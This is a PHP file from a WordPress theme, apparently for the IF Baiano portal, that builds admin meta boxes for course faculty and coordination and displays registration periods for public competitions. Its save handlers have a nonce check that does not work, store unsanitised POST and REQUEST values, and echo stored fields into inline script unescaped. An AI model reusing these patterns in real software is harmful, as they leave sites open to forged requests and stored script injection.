				$image_str .= '<li data-attechment-id=' . $values . '><a href="' . $image_attributes . '" target="_blank"><strong>' . $attachment_title . '</strong></a> - ' . $attachment_time . '<i class="dashicons dashicons-no delete-img"></i></li>';
			}
		}
	}

	if ($image_str) {
		$display = 'inline-block';
	}

	$listaDocs = '<div class="multi-upload-medias"><ul>' . $image_str . '</ul><a href="#" class="wc_multi_upload_image_button button' . $image . '</a><input type="hidden" class="attechments-ids ' . $name . '" name="' . $name . '" id="' . $name . '" value="' . esc_attr(implode(',', $value)) . '" /><!--<a href="#" class="wc_multi_remove_image_button button" style="color: #ffffff;border-color: #0b5777;background: #0071a1;margin-left:10px;display:inline-block;display:' . $display . '">Excluir todos os documentos</a>--></div>';


	return $listaDocs;
}


// Save Meta Box values.
add_action('save_post', 'wc_meta_box_save');

function wc_meta_box_save($post_id)
{
	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
		return;
	}

	if (!current_user_can('edit_post')) {
		return;
	}

	if (isset($_POST['post_banner_img'])) {
		update_post_meta($post_id, 'post_banner_img', $_POST['post_banner_img']);
	}
}
?>




<?php
// Add Meta Box to post
add_action('admin_init', 'single_rapater_meta_boxes', 2);

function single_rapater_meta_boxes()
{
	add_meta_box('single-repeter-data', 'Corpo Docente', 'single_repeatable_meta_box_callback', 'cursos', 'normal', 'default');
}

function single_repeatable_meta_box_callback($post)
{

	$single_repeter_group = get_post_meta($post->ID, 'single_repeter_group', true);
	$banner_img = get_post_meta($post->ID, 'post_banner_img', true);

	wp_nonce_field('repeterBox', 'formType');
	?>
	<script type="text/javascript">
		jQuery(document).ready(function ($) {
			$('#add-row').on('click', function () {
				var row = $('.empty-row.custom-repeter-text').clone(true);
				row.removeClass('empty-row custom-repeter-text').css('display', 'table-row');
				row.insertBefore('#repeatable-fieldset-one tbody>tr:last');
				return false;
			});

			$('.remove-row').on('click', function () {
				$(this).parents('tr').remove();
				return false;
			});
		});
	</script>

	<table id="repeatable-fieldset-one" width="100%">
		<tbody>
			<?php
			if ($single_repeter_group):
				foreach ($single_repeter_group as $field) {
					?>
					<tr>
						<td><input type="text" style="width:98%;" name="nome[]" value="<?php if ($field['nome'] != '')
							echo esc_attr($field['nome']); ?>" placeholder="Nome do(a) docente" /></td>
						<td><input type="text" style="width:98%;" name="titulacao[]" value="<?php if ($field['titulacao'] != '')
							echo esc_attr($field['titulacao']); ?>" placeholder="Titulação" /></td>
						<td><input type="text" style="width:98%;" name="email[]" value="<?php if ($field['email'] != '')
							echo esc_attr($field['email']); ?>" placeholder="docente@ifbaiano.edu.br" /></td>
						<td><input type="text" style="width:98%;" name="lattes[]" value="<?php if ($field['lattes'] != '')
							echo esc_attr($field['lattes']); ?>" placeholder="http://lattes.cnpq.br/docente" /></td>
						<td><a class="button remove-row" href="#1">Remover</a></td>
					</tr>
					<?php
				}
			else:
				?>
				<tr>
					<td><input type="text" style="width:98%;" name="nome[]" placeholder="Nome do(a) docente" /></td>
					<td><input type="text" style="width:98%;" name="titulacao[]" placeholder="Titulação" /></td>
					<td><input type="text" style="width:98%;" name="email[]" placeholder="docente@ifbaiano.edu.br" /></td>
					<td><input type="text" style="width:98%;" name="lattes[]" placeholder="http://lattes.cnpq.br/docente" />
					</td>
					<td><a class="button  cmb-remove-row-button button-disabled" href="#">Remover</a></td>
				</tr>

			<?php endif; ?>
			<tr class="empty-row custom-repeter-text" style="display: none">
				<td><input type="text" style="width:98%;" name="nome[]" placeholder="Nome do(a) docente" /></td>
				<td><input type="text" style="width:98%;" name="titulacao[]" placeholder="Titulação" /></td>
				<td><input type="text" style="width:98%;" name="email[]" placeholder="docente@ifbaiano.edu.br" /></td>
				<td><input type="text" style="width:98%;" name="lattes[]" placeholder="http://lattes.cnpq.br/docente" />
				</td>
				<td><a class="button remove-row" href="#">Remover</a></td>
			</tr>

		</tbody>
	</table>
	<p><a id="add-row" class="button" href="#">Adicionar</a></p>
	<?php
}

// Save Meta Box values.
add_action('save_post', 'single_repeatable_meta_box_save');

function single_repeatable_meta_box_save($post_id)
{

	if (!isset($_POST['formType']) && !wp_verify_nonce($_POST['formType'], 'repeterBox'))
		return;

	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
		return;

	if (!current_user_can('edit_post', $post_id))
		return;



	$old = get_post_meta($post_id, 'single_repeter_group', true);

	$new = array();
	$nomes = $_POST['nome'];
	$titulacaos = $_POST['titulacao'];
	$emails = $_POST['email'];
	$lattess = $_POST['lattes'];
	$coordenacaos = $_POST['coordenacao'];
	$count = count($nomes);
	for ($i = 0; $i < $count; $i++) {
		if ($nomes[$i] != '') {
			$new[$i]['nome'] = stripslashes(strip_tags($nomes[$i]));
			$new[$i]['titulacao'] = stripslashes($titulacaos[$i]);
			$new[$i]['email'] = stripslashes($emails[$i]);
			$new[$i]['lattes'] = stripslashes($lattess[$i]);
			$new[$i]['coordenacao'] = stripslashes($coordenacaos[$i]);
		}
	}

	if (!empty($new) && $new != $old) {
		update_post_meta($post_id, 'single_repeter_group', $new);
	} elseif (empty($new) && $old) {
		delete_post_meta($post_id, 'single_repeter_group', $old);
	}
	$repeter_status = $_REQUEST['repeter_status'];
	update_post_meta($post_id, 'repeter_status', $repeter_status);
}
?>










<?php

/* Define a meta box */

add_action('add_meta_boxes', 'coordenacao_add_custom_box', 1);

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'coordenacao_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'coordenacao_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de cursos */
function coordenacao_add_custom_box()
{
	$screens = array('cursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'coordenacao_sectionid',
			__('Coordenação do curso', 'coordenacao_textdomain'),
			'coordenacao_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function coordenacao_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'coordenacao_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$nomeCoo = get_post_meta($post->ID, 'coordenacao_nome', true);
	$titulacaoCoo = get_post_meta($post->ID, 'coordenacao_titulacao', true);
	$emailCoo = get_post_meta($post->ID, 'coordenacao_email', true);
	$lattesCoo = get_post_meta($post->ID, 'coordenacao_lattes', true);

	echo '<label for="coordenacao_new_field">';
	_e("", 'coordenacao_textdomain');
	echo '</label><table width="100%"><tbody><tr>';
	echo '<td><input style="width:98% "type="text" name="nome_coordenador" placeholder="Nome do(a) coordenador(a)" value="' . esc_attr($nomeCoo) . '"/></td>';
	echo '<td><input style="width:98%" type="text" name="titulacao_coordenador" placeholder="Titulação" value="' . esc_attr($titulacaoCoo) . '"/></td>';
	echo '<td><input style="width:98%" type="text" name="email_coordenador" placeholder="E-mail" value="' . esc_attr($emailCoo) . '"/></td>';
	echo '<td><input style="width:98%" type="text" name="lattes_coordenador" placeholder="Currículo Lattes" value="' . esc_attr($lattesCoo) . '"/></td>';
	echo '</tr></tbody></table>';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function coordenacao_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['coordenacao_noncename']) || !wp_verify_nonce($_POST['coordenacao_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$coordenacaoSAN = sanitize_text_field($_POST['nome_coordenador']);
	$tcoordenacaoSAN = sanitize_text_field($_POST['titulacao_coordenador']);
	$ecoordenacaoSAN = sanitize_text_field($_POST['email_coordenador']);
	$lcoordenacaoSAN = sanitize_text_field($_POST['lattes_coordenador']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'coordenacao_nome', $coordenacaoSAN);
	update_post_meta($post_ID, 'coordenacao_titulacao', $tcoordenacaoSAN);
	update_post_meta($post_ID, 'coordenacao_email', $ecoordenacaoSAN);
	update_post_meta($post_ID, 'coordenacao_lattes', $lcoordenacaoSAN);
}

// display da lista de concursos

function cardConcursos()
{
	$dataini = get_post_meta(get_the_ID(), 'inicio_inscricoes', true);
	$datafim = date("d/m/Y", strtotime(get_post_meta(get_the_ID(), 'final_inscricoes', true)));
	$horaini = get_post_meta(get_the_ID(), 'inicio_hora_inscricoes', true);
	$horafim = get_post_meta(get_the_ID(), 'final_hora_inscricoes', true);
	$datainiecho = date("d/m/Y", strtotime($dataini));
	$horainiecho = date("H", strtotime($horaini));
	$horafimecho = date("H", strtotime($horafim));

    echo '<div class="cardConcursos"><div class="imagemCardConcursos">';
	
	if (has_post_thumbnail()) echo '<a href="' . get_permalink() . '">' . the_post_thumbnail() . '</a>';
	else echo '<img src="https://ifbaiano.edu.br/portal/wp-content/uploads/2021/04/imagem-marca-site-concursos-2021.png" alt="Concurso IF Baiano" />';

	echo '</div><div class="infoCardConcursos"><a href="' . get_permalink() . '">' . get_the_title() . '</a>';

	?>
	<script>
		(() => {
			const dataAtual = new Date();
			const dataAtualParse = Date.parse(dataAtual);
			const horaFinal = '<?php echo $horafim; ?>'.split(":");
			const inicioInscricoes = '<?php echo $datainiecho; ?>'.split("/");
			const inicioData = Date.parse(new Date(inicioInscricoes[2], inicioInscricoes[1] - 1, inicioInscricoes[0]));
			const fimInscricoes = '<?php echo $datafim; ?>'.split("/");
			const fimData = Date.parse(new Date(fimInscricoes[2], fimInscricoes[1] - 1, fimInscricoes[0]));
			const fimParseData = new Date(fimData).setHours(horaFinal[0]);
			const horaInicial = '<?php echo $horaini; ?>'.split(":");
			const horaIni = horaInicial[0] * 3600;
			
			if (dataAtualParse >= inicioData + horaIni && dataAtualParse <= fimParseData) {
				inscricoesAbertas = 'Inscrições abertas';
				timestampInicioInscricoes = inicioData;
			} else {
				inscricoesAbertas = 'Fora do período de inscrições';
				timestampInicioInscricoes = 0;
			}
			
		})();
	</script>
	<?php
	echo '<div class="avisoInscricoes"><script>document.write(inscricoesAbertas)</script><span class="timestampInicioInscricoes" style="visibility:hidden"><script>document.write(timestampInicioInscricoes)</script></span></div>';

	if (!empty($dataini) && !empty($horaini) && !empty($horafim) && !($horaini == 0) && !($horafim == 0)) {
		echo 'Das ' . $horainiecho . ' horas de ' . $datainiecho . ' às ' . $horafimecho . ' horas de ' . $datafim . '.';
	} else if (!empty($dataini) && !empty($horaini) && !empty($horafim) && $horaini == 0 && $horafim == 0) {
		echo 'De ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && !empty($horaini) && !empty($horafim) && $horaini == 0 && !($horafim == 0)) {
		echo 'De ' . $datainiecho . ' às ' . $horafimecho . ' horas de ' . $datafim . '.';
	} else if (!empty($dataini) && !empty($horaini) && !empty($horafim) && !($horaini == 0) && $horafim == 0) {
		echo 'Das ' . $horainiecho . ' horas de ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && empty($horaini) && empty($horafim)) {
		echo 'De ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && !empty($horaini) && empty($horafim) && $horaini == 0) {
		echo 'De ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && !empty($horaini) && empty($horafim) && !($horaini == 0)) {
		echo 'Das ' . $horainiecho . ' horas de ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && empty($horaini) && !empty($horafim) && $horafim == 0) {
		echo 'De ' . $datainiecho . ' a ' . $datafim . '.';
	} else if (!empty($dataini) && empty($horaini) && !empty($horafim) && !($horafim == 0)) {
		echo 'De ' . $datainiecho . ' às ' . $horafimecho . ' horas de ' . $datafim . '.';
	} else if (empty($dataini) && !empty($datafim) && !($horafim == 0)) {
		echo 'Até às ' . $horafimecho . ' horas de ' . $datafim . '.';
	} else if (empty($dataini) && !empty($datafim) && empty($horafim) && $datafim !== '01/01/1970') {
		echo 'Até ' . $datafim . '.';
	}
	echo '</div></div>';
}

?>